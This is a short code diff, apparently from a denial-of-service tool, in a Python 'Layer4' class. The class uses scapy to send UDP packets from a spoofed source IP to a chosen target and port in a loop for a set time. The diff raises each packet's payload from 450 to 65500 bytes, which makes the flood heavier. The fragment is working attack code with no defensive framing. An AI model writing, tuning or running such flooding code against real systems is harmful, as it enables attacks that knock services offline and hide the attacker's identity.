@@ -20,7 +20,7 @@ class Layer4:
         end_t = timing.time() + time
         ip_packet = scapy.all.IP(dst=str(target), src=spoof_ip())
         udp_packet = scapy.all.UDP(sport=rand_int(), dport=int(port))
-        payload = "A" * 450
+        payload = "A" * 65500
         while (timing.time() < end_t):
             send(ip_packet/udp_packet/payload, verbose=0)
 
